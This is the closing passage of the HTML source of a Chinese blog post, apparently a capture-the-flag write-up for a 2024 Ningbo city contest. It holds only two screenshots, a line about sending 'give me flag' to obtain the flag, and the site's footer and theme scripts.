+<p><img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-6.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-6.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-6.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-6.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-6.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-6.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后发送消息 <code>give me flag</code>
+在网页中得到 <code>flag</code></p>
+<p><img loading="lazy" src="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-7.png" alt="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-7.png" srcset="/posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-7.png?size=small, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-7.png?size=medium 1.5x, /posts/2024%e5%b9%b4%e7%ac%ac%e4%b8%83%e5%b1%8a%e5%a4%a9%e4%b8%80%e6%b0%b8%e5%ae%89%e6%9d%af%e5%ae%81%e6%b3%a2%e5%b8%82%e8%b5%9b%e5%88%9d%e8%b5%9bWP/image-7.png?size=large 2x" data-title="/posts/2024年第七届天一永安杯宁波市赛初赛WP/image-7.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2024-05-06 09:30:21">更新于 2024-05-06&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="//localhost:1313/posts/2024%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/" data-title="2024年第七届天一永安杯宁波市赛初赛WP" data-hashtags="比赛,WP"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="//localhost:1313/posts/2024%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/" data-hashtag="比赛"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="//localhost:1313/posts/2024%E5%B9%B4%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%A4%A9%E4%B8%80%E6%B0%B8%E5%AE%89%E6%9D%AF%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9Bwp/" data-title="2024年第七届天一永安杯宁波市赛初赛WP"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%AF%94%E8%B5%9B/" class="post-tag" title="标签 - 比赛">比赛</a><a href="/tags/wp/" class="post-tag" title="标签 - WP">WP</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/edebc43/" class="post-nav-item" rel="prev" title="2023年第三届陕西省大学生网络安全技能大赛WP"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>2023年第三届陕西省大学生网络安全技能大赛WP</a>
+      <a href="/posts/%E7%AC%AC%E4%B8%83%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9Bwp/" class="post-nav-item" rel="next" title="第七届浙江省大学生网络与信息安全竞赛决赛WP">第七届浙江省大学生网络与信息安全竞赛决赛WP<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.124.0"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' target='_blank'>CC BY-NC-SA 4.0</a></span></div><div class="footer-line statistics"><span class="site-time" title='网站运行中……'><i class="fa-solid fa-heartbeat fa-fw animate-icon" aria-hidden="true"></i><span class="ms-1 d-none">网站已运行</span><span class="run-times ms-1">网站运行中……</span></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div><div class="footer-line beian"><span class="icp footer-divider"><a target='_blank' href='https://beian.miit.gov.cn'><span>浙ICP备2022018709号-1</span></a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":100},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"algoliaAppID":"1B34K5GM70","algoliaIndex":"zh-cn","algoliaSearchKey":"f451200a38d4847e61233f19ab4e5cc1","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":30,"type":"algolia"},"siteTime":"2024-03-20T10:12:22+08:00"};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
